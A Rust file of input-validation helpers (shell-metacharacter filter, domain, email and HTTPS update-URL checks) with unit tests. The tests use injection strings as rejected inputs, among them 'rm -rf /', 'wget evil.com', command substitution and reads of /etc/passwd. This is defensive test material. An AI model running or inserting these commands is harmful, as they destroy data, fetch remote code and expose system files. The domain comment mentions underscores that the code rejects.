/// Input validation helpers for security-sensitive operations.
/// Check that a string is safe for inclusion in a shell command.
/// Rejects shell metacharacters, command substitution, pipes, and other injection vectors.
pub fn is_safe_shell_value(value: &str) -> bool {
    if value.is_empty() {
        return false;
    }
    // Reject any shell metacharacters
    let dangerous_chars = [
        ';', '&', '|', '$', '`', '(', ')', '{', '}', '<', '>', '!', '\\', '"', '\'', '\n', '\r',
        '\0',
    ];
    for ch in dangerous_chars {
        if value.contains(ch) {
            return false;
        }
    }
    // Reject whitespace-based injection (spaces are ok in emails but not with metacharacters)
    // Already covered above, but also reject tabs
    if value.contains('\t') {
        return false;
    }
    true
}

/// Validate a domain name: only alphanumeric, hyphens, dots, and underscores.
pub fn is_valid_domain(domain: &str) -> bool {
    if domain.is_empty() || domain.len() > 253 {
        return false;
    }
    domain
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.')
        && !domain.starts_with('-')
        && !domain.ends_with('-')
}

/// Validate an email address (basic RFC 5322 check — no shell metacharacters).
pub fn is_valid_email(email: &str) -> bool {
    if !is_safe_shell_value(email) {
        return false;
    }
    // Must have exactly one @, with non-empty local and domain parts
    let parts: Vec<&str> = email.splitn(2, '@').collect();
    if parts.len() != 2 {
        return false;
    }
    let local = parts[0];
    let domain = parts[1];
    if local.is_empty() || domain.is_empty() {
        return false;
    }
    is_valid_domain(domain)
}

/// Validate that a URL uses HTTPS. Rejects HTTP and other schemes.
pub fn is_safe_update_url(url: &str) -> bool {
    url.starts_with("https://")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shell_injection_vectors_rejected() {
        assert!(!is_safe_shell_value("test; rm -rf /"));
        assert!(!is_safe_shell_value("test && wget evil.com"));
        assert!(!is_safe_shell_value("test$(whoami)"));
        assert!(!is_safe_shell_value("test`id`"));
        assert!(!is_safe_shell_value("test | cat /etc/passwd"));
        assert!(!is_safe_shell_value("test\nmalicious"));
        assert!(!is_safe_shell_value(""));
    }

    #[test]
    fn test_safe_values_accepted() {
        assert!(is_safe_shell_value("hello"));
        assert!(is_safe_shell_value("user@example.com"));
        assert!(is_safe_shell_value("my-domain.example.com"));
        assert!(is_safe_shell_value("test123"));
    }

    #[test]
    fn test_domain_validation() {
        assert!(is_valid_domain("example.com"));
        assert!(is_valid_domain("sub.example.co.uk"));
        assert!(is_valid_domain("my-site.com"));
        assert!(!is_valid_domain("example.com; rm -rf /"));
        assert!(!is_valid_domain(""));
        assert!(!is_valid_domain("-bad.com"));
    }

    #[test]
    fn test_email_validation() {
        assert!(is_valid_email("test@example.com"));
        assert!(is_valid_email("user+tag@sub.example.com"));
        assert!(!is_valid_email("test@x.com; rm -rf /"));
        assert!(!is_valid_email("test@x.com$(whoami)"));
        assert!(!is_valid_email("notanemail"));
        assert!(!is_valid_email("@example.com"));
        assert!(!is_valid_email("test@"));
    }

    #[test]
    fn test_update_url_validation() {
        assert!(is_safe_update_url("https://releases.example.com/binary"));
        assert!(!is_safe_update_url("http://releases.example.com/binary"));
        assert!(!is_safe_update_url("ftp://releases.example.com/binary"));
        assert!(!is_safe_update_url("file:///etc/passwd"));
    }
}
